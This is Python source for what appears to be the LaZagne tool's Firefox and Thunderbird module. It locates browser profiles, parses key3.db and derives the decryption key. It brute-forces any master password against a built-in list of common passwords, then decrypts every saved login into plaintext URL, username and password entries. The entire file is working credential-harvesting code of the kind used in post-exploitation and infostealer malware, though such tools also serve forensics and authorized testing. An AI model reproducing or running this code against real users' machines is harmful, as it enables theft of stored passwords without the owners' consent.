#!/usr/bin/env python
# -*- coding: utf-8 -*- 
# Required files (key3.db, signongs.sqlite, cert8.db)
# Inspired from https://github.com/Unode/firefox_decrypt/blob/master/firefox_decrypt.py
# portable decryption functions and BSD DB parsing by Laurent Clevy (@lorenzo2472) from https://github.com/lclevy/firepwd/blob/master/firepwd.py 

from lazagne.config.write_output import print_debug
from lazagne.config.moduleInfo import ModuleInfo
from lazagne.config.constant import *
from ConfigParser import RawConfigParser
from Crypto.Util.number import long_to_bytes 
from lazagne.config.dico import get_dico
from pyasn1.codec.der import decoder
from Crypto.Cipher import DES3
from binascii import unhexlify
from itertools import product
from base64 import b64decode
from struct import unpack
from hashlib import sha1
from ctypes import *
import sqlite3
import shutil
import json
import hmac
import os

# Database classes
class Credentials(object):
	def __init__(self, db):
		self.db = db
		if os.path.isfile(db):
			# Check if the database is not empty
			if not open(db, 'r').read():
				print_debug('DEBUG', u'Empty database: {db}'.format(db=db))
				raise Exception('Empty database: {db}'.format(db=db))
		else:
			print_debug('DEBUG', u'Database not found: {db}'.format(db=db))
			raise Exception('Database not found: {db}'.format(db=db))

	def __iter__(self):
		pass
	
	def done(self):
		pass

class JsonDatabase(Credentials):
	def __init__(self, profile):
		db = os.path.join(profile, u'logins.json')
		super(JsonDatabase, self).__init__(db)
	
	def __iter__(self):
		if os.path.exists(self.db):
			with open(self.db) as fh:
				data = json.load(fh)
				try:
					logins = data['logins']
				except:
					raise Exception('Unrecognized format in {db}'.format(db=self.db))
				
				for i in logins:
					yield (i['hostname'], i['encryptedUsername'], i['encryptedPassword'])

class SqliteDatabase(Credentials):
	def __init__(self, profile):
		db = os.path.join(profile, u'signons.sqlite')
		super(SqliteDatabase, self).__init__(db)
		self.conn 	= sqlite3.connect(db)
		self.c 		= self.conn.cursor()
	
	def __iter__(self):
		self.c.execute('SELECT hostname, encryptedUsername, encryptedPassword FROM moz_logins')
		for i in self.c:
			yield i
	
	def done(self):
		super(SqliteDatabase, self).done()
		self.c.close()
		self.conn.close()


class Mozilla(ModuleInfo):

	def __init__(self, isThunderbird=False):
		
		self.key3 	= ''
		name 		= 'thunderbird' if isThunderbird else 'firefox'
		
		ModuleInfo.__init__(self, name=name, category='browsers')

	def get_path(self, software_name):
		path = ''
		if software_name == 'Firefox':
			path =  u'{appdata}\\Mozilla\\Firefox'.format(appdata=constant.profile['APPDATA'])
		elif software_name == 'Thunderbird':
			path = u'{appdata}\\Thunderbird'.format(appdata=constant.profile['APPDATA'])
		return path
	
	# --------------------------------------------
	def getShortLE(self, d, a):
		return unpack('<H',(d)[a:a+2])[0]

	def getLongBE(self, d, a):
		return unpack('>L',(d)[a:a+4])[0]

	def printASN1(self, d, l, rl):
		type = ord(d[0])
		length = ord(d[1])
		if length&0x80 > 0: # http://luca.ntop.org/Teaching/Appunti/asn1.html,
			nByteLength = length&0x7f
			length = ord(d[2])  
			# Long form. Two to 127 octets. Bit 8 of first octet has value "1" and bits 7-1 give the number of additional length octets. 
			skip=1
		else:
			skip=0    

		if type==0x30:
			seqLen = length
			readLen = 0
			while seqLen>0:
				len2 = self.printASN1(d[2+skip+readLen:], seqLen, rl+1)
				seqLen = seqLen - len2
				readLen = readLen + len2
			return length+2
		elif type==6: # OID
			return length+2
		elif type==4: # OCTETSTRING
			return length+2
		elif type==5: # NULL
			# print 0
			return length+2
		elif type==2: # INTEGER
			return length+2
		else:
			if length==l-2:
				self.printASN1( d[2:], length, rl+1)
				return length   

	#extract records from a BSD DB 1.85, hash mode       
	def readBsddb(self, name):   
		f = open(name,'rb')
		
		#http://download.oracle.com/berkeley-db/db.1.85.tar.gz
		header 	= f.read(4*15)
		magic 	= self.getLongBE(header,0)
		if magic != 0x61561:
			print_debug('WARNING', u'Bad magic number')
			return False
		
		version = self.getLongBE(header,4)
		if version !=2:
			print_debug('WARNING', u'Bad version !=2 (1.85)')
			return False
		
		pagesize 	= self.getLongBE(header,12)
		nkeys 		= self.getLongBE(header,0x38) 

		readkeys 	= 0
		page 		= 1
		nval 		= 0
		val 		= 1
		db1 		= []
		while (readkeys < nkeys):
			f.seek(pagesize*page)
			offsets 	= f.read((nkeys+1)* 4 +2)
			offsetVals 	= []
			i 			= 0
			nval 		= 0
			val 		= 1
			keys 		= 0

			while nval != val :
				keys 	+=1
				key 	= self.getShortLE(offsets,2+i)
				val 	= self.getShortLE(offsets,4+i)
				nval 	= self.getShortLE(offsets,8+i)
				offsetVals.append(key+ pagesize*page)
				offsetVals.append(val+ pagesize*page)  
				readkeys 	+= 1
				i 			+= 4
			
			offsetVals.append(pagesize*(page+1))
			valKey = sorted(offsetVals)  
			for i in range( keys*2 ):
				f.seek(valKey[i])
				data = f.read(valKey[i+1] - valKey[i])
				db1.append(data)
			page += 1
		f.close()
		
		db = {}
		for i in range( 0, len(db1), 2):
			db[ db1[i+1] ] = db1[ i ]

		return db  

	def decrypt3DES(self, globalSalt, masterPassword, entrySalt, encryptedData):
		#see http://www.drh-consultancy.demon.co.uk/key3.html
		hp 	= sha1( globalSalt+masterPassword ).digest()
		pes = entrySalt + '\x00'*(20-len(entrySalt))
		chp = sha1( hp+entrySalt ).digest()
		k1 	= hmac.new(chp, pes+entrySalt, sha1).digest()
		tk 	= hmac.new(chp, pes, sha1).digest()
		k2 	= hmac.new(chp, tk+entrySalt, sha1).digest()
		k 	= k1+k2
		iv 	= k[-8:]
		key = k[:24]

		return DES3.new( key, DES3.MODE_CBC, iv).decrypt(encryptedData)

	def extractSecretKey(self, globalSalt, masterPassword, entrySalt):

		(globalSalt, masterPassword, entrySalt) = self.is_masterpassword_correct(masterPassword)
		
		if unhexlify('f8000000000000000000000000000001') not in self.key3:
			return None
		
		privKeyEntry 		= self.key3[ unhexlify('f8000000000000000000000000000001') ]
		saltLen 			= ord( privKeyEntry[1] )
		nameLen 			= ord( privKeyEntry[2] )
		privKeyEntryASN1 	= decoder.decode( privKeyEntry[3+saltLen+nameLen:] )
		data 				= privKeyEntry[3+saltLen+nameLen:]
		self.printASN1(data, len(data), 0)
		
		# see https://github.com/philsmd/pswRecovery4Moz/blob/master/pswRecovery4Moz.txt
		entrySalt 	= privKeyEntryASN1[0][0][1][0].asOctets()
		privKeyData = privKeyEntryASN1[0][1].asOctets()
		privKey 	= self.decrypt3DES( globalSalt, masterPassword, entrySalt, privKeyData )
		self.printASN1(privKey, len(privKey), 0)
		privKeyASN1 = decoder.decode( privKey )
		prKey 		= privKeyASN1[0][2].asOctets()
		self.printASN1(prKey, len(prKey), 0)
		prKeyASN1 	= decoder.decode( prKey )
		id 			= prKeyASN1[0][1]
		key 		= long_to_bytes( prKeyASN1[0][3] )

		print_debug('DEBUG', u'key: {key}'.format(key=repr(key)))
		return key

	# --------------------------------------------
	
	# Get the path list of the firefox profiles
	def get_firefox_profiles(self, directory):
		cp = RawConfigParser()
		try:
			cp.read(os.path.join(directory, 'profiles.ini'))
			profile_list = []
			for section in cp.sections():
				if section.startswith('Profile'):
					if cp.has_option(section, 'Path'):
						profile_list.append(os.path.join(directory, cp.get(section, 'Path').strip()))
			return profile_list
		except:
			return []
	
	# ------------------------------ Master Password Functions ------------------------------
	
	def is_masterpassword_correct(self, masterPassword=''):
		try:
			# see http://www.drh-consultancy.demon.co.uk/key3.html
			pwdCheck 		= self.key3['password-check']	
			entrySaltLen 	= ord(pwdCheck[1])
			entrySalt 		= pwdCheck[3: 3+entrySaltLen]
			encryptedPasswd = pwdCheck[-16:]
			globalSalt 		= self.key3['global-salt']
			cleartextData 	= self.decrypt3DES( globalSalt, masterPassword, entrySalt, encryptedPasswd )
			if cleartextData != 'password-check\x02\x02':
				return ('', '', '')

			return (globalSalt, masterPassword, entrySalt)
		except:
			return ('', '', '')
	
	# Retrieve masterpassword
	def found_masterpassword(self):
		
		# 500 most used passwords
		wordlist = get_dico() + constant.passwordFound
		num_lines = (len(wordlist)-1)
		print_debug('ATTACK', u'%d most used passwords !!! ' % num_lines)

		for word in wordlist:
			if self.is_masterpassword_correct(word)[0]:
				print_debug('FIND', u'Master password found: {master_password}'.format(master_password=word.strip()))
				return word
			
		print_debug('WARNING', u'No password has been found using the default list')
		return False

	def get_database(self, profile):
		# Check if passwords are stored on the Json format
			try:
				return JsonDatabase(profile)
			except:
				# Check if passwords are stored on the sqlite format
				try:
					return SqliteDatabase(profile)
				except:
					pass
			return False
	
	# Remove bad character at the end
	def remove_padding(self, data):
		try:
			nb = unpack('B', data[-1])[0]
			return data[:-nb]
		except:
			return data

	# ------------------------------ End of Master Password Functions ------------------------------
	
	# main function
	def run(self, software_name=None):
		
		# get the installation path
		path = self.get_path(software_name)
		if os.path.exists(path):
			profile_list 	= self.get_firefox_profiles(path)
			pwdFound 		= []

			for profile in profile_list:
				p = os.path.join(path, profile)
				print_debug('INFO', u'Profile path found: {profile}'.format(profile=p))
				if not os.path.exists(os.path.join(p, 'key3.db')):
					print_debug('WARNING', u'key3 file not found: {key3_file}'.format(key3_file=self.key3))
					continue

				self.key3 = self.readBsddb(os.path.join(p, u'key3.db'))
				if not self.key3:
					continue

				credentials = self.get_database(p)
				if credentials:

					(globalSalt, masterPassword, entrySalt) = self.is_masterpassword_correct()
					
					# Find masterpassword if set
					if not globalSalt:
						print_debug('WARNING', u'Master Password is used !') 
						masterPassword = self.found_masterpassword()
						if not masterPassword:
							continue
					
					# Get user secret key
					key = self.extractSecretKey(globalSalt, masterPassword, entrySalt)

					# Everything is ready to decrypt password
					for host, user, passw in credentials:

						try:
							# Login	
							loginASN1 	= decoder.decode(b64decode(user))
							iv 			= loginASN1[0][1][1].asOctets()
							ciphertext 	= loginASN1[0][2].asOctets()
							login 		= DES3.new( key, DES3.MODE_CBC, iv).decrypt(ciphertext)
							
							# Password
							passwdASN1 	= decoder.decode(b64decode(passw))
							iv 			= passwdASN1[0][1][1].asOctets()
							ciphertext 	= passwdASN1[0][2].asOctets()
							password 	= DES3.new( key, DES3.MODE_CBC, iv).decrypt(ciphertext)

							pwdFound.append(
												{
													'URL'		: host,
													'Login'		: self.remove_padding(login),
													'Password'	: self.remove_padding(password),
												}
											)
						except Exception, e:
							print_debug('DEBUG', u'An error occured decrypting the password: {error}'.format(error=e))

			return pwdFound
